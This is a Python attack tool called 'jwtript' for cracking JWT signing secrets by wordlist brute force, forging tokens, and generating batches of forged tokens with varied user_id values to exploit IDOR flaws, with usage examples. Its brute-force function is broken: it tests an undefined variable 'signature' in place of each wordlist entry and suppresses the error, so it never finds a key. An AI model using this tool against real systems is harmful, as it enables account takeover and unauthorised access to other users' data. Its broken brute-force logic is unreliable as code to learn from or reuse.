import jwt
import time
import sys


# start of defs
class bcolors:
  HEADER    = '\033[95m'
  OKBLUE    = '\033[94m'
  OKGREEN   = '\033[92m'
  WARNING   = '\033[93m'
  FAIL      = '\033[91m'
  ENDC      = '\033[0m'
  BOLD      = '\033[1m'
  UNDERLINE = '\033[4m'
  CBLINK    = '\033[5m'
  CYELLOW = '\033[33m'


def usage():
    print(bcolors.OKBLUE + "\n\n -- -- jwtript -- -- " + bcolors.ENDC)
    print(bcolors.OKBLUE + " -- author: kaan tekiner -- " + bcolors.ENDC)
    print(bcolors.OKGREEN + "\n\n -- capabilities: -- \n" + bcolors.ENDC)
    print(bcolors.ENDC + " 1 - brute force a jwt tokens secret key" + bcolors.ENDC)
    print(bcolors.ENDC + " 2 - forge a jwt token with secret key" + bcolors.ENDC)
    print(bcolors.ENDC + " 3 - decrypt a jwt token with provided secret key" + bcolors.ENDC)
    print(bcolors.ENDC + " 4 - generate a jwt token brute forcer list with secret key, for idor vuln." + bcolors.ENDC)


    print(bcolors.HEADER + "\n\n -- what script need? -- " + bcolors.ENDC)
    print(bcolors.ENDC + "\n a - job to do: brute-force[1], forge jwt[2], decrypt jwt[3], generate jwts[4]" + bcolors.ENDC)
    print(bcolors.ENDC + " b - sometimes the jwt token itself " + bcolors.ENDC)
    print(bcolors.ENDC + " c - sometimes the secret key of token also" + bcolors.ENDC)
    print(bcolors.ENDC + " d - files for bruteforce and generation" + bcolors.ENDC)

    print(bcolors.WARNING + "\n\n -- USAGE, technically -- " + bcolors.ENDC)
    print(bcolors.ENDC + "\n python3 <thescript> <brute> <jwt_key> <wordlist> <encryption_algorithm>  --> [1] brute force -- " + bcolors.ENDC)
    print(bcolors.ENDC + " python3 <thescript> <forge> <the_payloads> <secret_key> <encryption_algorithm>  --> [2] forge a jwt -- " + bcolors.ENDC)
    print(bcolors.ENDC + " python3 <thescript> <decrypt> <jwt_key> <secret_key> <encryption_algorithm>  --> [3] decrypt a jwt -- " + bcolors.ENDC)
    print(bcolors.ENDC + " python3 <thescript> <generate> <original_jwt> <secret_key> <encryption_algorithm> <parameter_to_change> <min_number> <max_number> <out_file>  --> [4] generate a jwt list w/ diffrent param values -- " + bcolors.ENDC)

    print(bcolors.WARNING + "\n\n -- USAGE, examples -- " + bcolors.ENDC)
    print(bcolors.ENDC + "\n python3 jwtript.py brute eyJh.eyJzdWIiOiIx.SflKxwR /usr/rockyou.txt HS256  --> [1] brute force -- " + bcolors.ENDC)
    print(bcolors.ENDC + " python3 jwtript.py forge int:id:1,str:name:jack,bool:admin:false,flo:age:23.57,list:notes:1-2-3-abcd mysecretkey HS512  --> [2] forge a jwt -- " + bcolors.ENDC)
    print(bcolors.ENDC + " python3 jwtript.py decrypt eyJh.eyJzdWIiOiIx.SflKxwR mymegasecretkey HS256  --> [3] decrypt a jwt -- " + bcolors.ENDC)
    print(bcolors.ENDC + " python3 jwtript.py generate eyJh.eyJzdWIiOiIx.SflKxwR secretpass HS512 user_id 1 1234 /usr/newjwts.txt  --> [4] generate a jwt list w/ diffrent user_id values -- " + bcolors.ENDC)
    
    print(bcolors.OKGREEN + "\n\n -- developed -- " + bcolors.ENDC)
    print(bcolors.OKGREEN + " -- with -- " + bcolors.ENDC)
    print(bcolors.OKGREEN + " -- love & py3 <3 -- " + bcolors.ENDC)
    print("\n")
    sys.exit(0)


def decode_one(jwtkey, secret_key, enc_alg):
    try:
        print(bcolors.ENDC + "\nkey in use is: " + secret_key + bcolors.ENDC)
        print(bcolors.OKBLUE + " -- trying to decrypt with your secrey key -- " + bcolors.ENDC)
        decoded = jwt.decode(jwtkey, secret_key, algorithms=[enc_alg])
        print(decoded)
        print(bcolors.OKGREEN + " -- successsss -- \n" + bcolors.ENDC)
    except Exception as err:
        print("\n" + str(err))
        print(bcolors.FAIL + " -- oh no, wrong key... -- " + bcolors.ENDC)
        print(bcolors.FAIL + " -- quiting... -- \n" + bcolors.ENDC)


def encode_one(payloads, secret_key, enc_alg):
    try:
        print(bcolors.OKBLUE + "\n -- encodeeee -- " + bcolors.ENDC)
        payload_dict = {}
        payloadlist = payloads.split(",")
        # print(payloadlist)
        for alist in payloadlist:
            littlelist = alist.split(",")
            an_item_list = littlelist[0].split(":")
            #print(an_item_list)
            if an_item_list[0] == "int":
                payload_dict[an_item_list[1]] = int(an_item_list[2])
            if an_item_list[0] == "str":
                payload_dict[an_item_list[1]] = str(an_item_list[2])
            if an_item_list[0] == "bool" and an_item_list[2].lower() == "true":
                payload_dict[an_item_list[1]] = True
            if an_item_list[0] == "bool" and an_item_list[2].lower() == "false":
                payload_dict[an_item_list[1]] = False
            if an_item_list[0] == "flo":
                payload_dict[an_item_list[1]] = float(an_item_list[2])
            if an_item_list[0] == "list":
                payload_dict[an_item_list[1]] = an_item_list[2].split("-")
            #print(payload_dict)
        encoded = jwt.encode(payload_dict, secret_key, algorithm=enc_alg)
        print(encoded)
        print(bcolors.OKGREEN + " -- successsss -- \n" + bcolors.ENDC)
        sys.exit(0)
    except Exception as err:
        print(bcolors.FAIL + " -- oh no, error... -- " + bcolors.ENDC)
        print(str(err))
        print(bcolors.FAIL + " -- quiting... -- \n" + bcolors.ENDC)


def try_to_decode(wordlist, jwt_token, enc_alg):
    print(bcolors.OKGREEN + "\n -- brute force mode enabled -- " + bcolors.ENDC)
    
    print("reading words from the file and processing, please wait....")
    with open(wordlist,encoding='utf-8',errors='ignore') as f:
        print(bcolors.OKBLUE + " -- decodiiiiiing -- \n" + bcolors.ENDC)
        time.sleep(1)
        count = 0
        write_at = 10000000
        for line in f:
            try:
                count +=1
                if count == 1 or count % write_at == 0:
                    print("trying word " + str(count) + " " + line)
                decoded = jwt.decode(jwt_token, signature, algorithms=[enc_alg])
                print(bcolors.OKGREEN + "\n -- " + "success" + " -- " + bcolors.ENDC)
                print(bcolors.ENDC + " -- " + str(decoded) + " -- " + bcolors.ENDC)
                print(bcolors.OKBLUE + " -- " + "secret: " + str(signature) + " -- " + bcolors.ENDC)
                print(bcolors.OKGREEN + " -- " + "quiting..." + " -- \n" + bcolors.ENDC)
                sys.exit(0)
            except Exception as err:
                if count == 1 or count % write_at == 0:
                    # print(str(err))
                    print(bcolors.FAIL + " -- " + "...failed..." + " -- " + bcolors.ENDC)


def generate_jwts(original_jwt, secret_key, hashalgr, param, min, max, outfile):
    try:
        print(bcolors.OKBLUE + "\n -- trying to decrypt and read original jwt with key -- " + bcolors.ENDC)
        # decoded = jwt.decode(original_jwt, options={"verify_signature": False}) # works in PyJWT >= v2.0
        decoded = jwt.decode(original_jwt, secret_key, algorithms=[hashalgr])
        print(decoded)
        print(bcolors.OKGREEN + " -- decrypt successsss -- " + bcolors.ENDC)
        #print(bcolors.OKBLUE + "\n -- parsing the values from it... -- " + bcolors.ENDC)
        #parse vals
        print(bcolors.OKBLUE + "\n -- will try to forge the same one... -- " + bcolors.ENDC)
        newly_encoded = jwt.encode(decoded, secret_key, algorithm=hashalgr)
        print(newly_encoded)
        print(bcolors.OKGREEN + " -- forge of new one successsss -- " + bcolors.ENDC)
        print(bcolors.OKBLUE + "\n -- will try to forge new ones with new " + param + " values between " + str(min) + " and " + str(max) + " ... -- " + bcolors.ENDC)
        print(bcolors.OKBLUE + " -- building output file... -- " + bcolors.ENDC)
        with open(outfile, 'w') as the_file:
            print(bcolors.OKGREEN + " -- forge started... -- " + bcolors.ENDC)
            for i in range(int(min), int(max) + 1):
                decoded[param] = i
                the_file.write(jwt.encode(decoded, secret_key, algorithm=hashalgr) + "\n")
        print(bcolors.OKGREEN + " -- forge complete, list ready... -- " + bcolors.ENDC)
        print(bcolors.OKBLUE + " -- " + "quiting..." + " -- \n" + bcolors.ENDC)
    except Exception as err:
        print(bcolors.FAIL + " -- oh no, an error... --" + bcolors.ENDC)
        print(str(err))
        print(bcolors.FAIL + " -- quiting... -- \n" + bcolors.ENDC)




# script started
list = ["brute", "forge", "decrypt", "-h", "generate"]
if len(sys.argv) < 2 or sys.argv[1] == None or sys.argv[1] == "" or sys.argv[1] not in list or sys.argv[1] == "-h":
    usage()
    sys.exit(0)
try:
    if sys.argv[1] == "brute":
        try_to_decode(sys.argv[3], sys.argv[2], sys.argv[4])
    if sys.argv[1] == "forge":
        encode_one(sys.argv[2], sys.argv[3], sys.argv[4])
    if sys.argv[1] == "decrypt":
        decode_one(sys.argv[2], sys.argv[3], sys.argv[4])
    if sys.argv[1] == "generate":
        generate_jwts(sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5], sys.argv[6], sys.argv[7], sys.argv[8])


except Exception as err:
    print("\n" + str(err))
    print(bcolors.FAIL + " -- " + "... wrong usage ..." + " -- \n" + bcolors.ENDC)






















